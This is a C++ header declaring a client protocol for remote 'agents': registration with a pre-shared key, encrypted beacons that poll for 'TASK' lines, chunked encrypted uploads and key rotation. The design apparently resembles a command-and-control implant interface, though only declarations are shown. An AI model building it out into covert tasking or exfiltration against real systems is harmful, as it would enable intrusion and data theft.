#pragma once
#include <cstdint>
#include <string>
#include <string_view>
#include <vector>

namespace tx { class Profile; }

namespace proto {

struct Session {
    std::string agent_id;
    std::vector<std::uint8_t> session_key; // 32 bytes
};

bool register_agent(std::string_view psk, Session& out);

enum class BeaconStatus {
    Ok,
    TransportFail,
    UnknownAgent,
    DecryptFail,
};

struct BeaconResult {
    BeaconStatus status = BeaconStatus::TransportFail;
    std::string payload; // decrypted reply when status == Ok
};

// POST /beacon; reply is "NOP" or "TASK:<id>:<line>".
std::string beacon(std::string_view agent_id, const std::uint8_t key[32],
                   std::string_view enc_payload);

// Like beacon(), but surfaces UnknownAgent for re-register.
BeaconResult beacon_ex(std::string_view agent_id, const std::uint8_t key[32],
                       std::string_view enc_payload);

std::string encrypt_payload(std::string_view plaintext, const std::uint8_t key[32]);

std::string encrypt_for_chunk(std::string_view agent_id, const std::uint8_t key[32],
                              std::string_view chunk_id, int seq, int total,
                              std::string_view chunk_data);

bool rotate_key(std::string_view agent_id, const std::uint8_t old_key[32], std::uint8_t new_key[32]);

// Flat JSON: finds "key":"value".
std::string json_string(std::string_view json, std::string_view key);

} // namespace proto
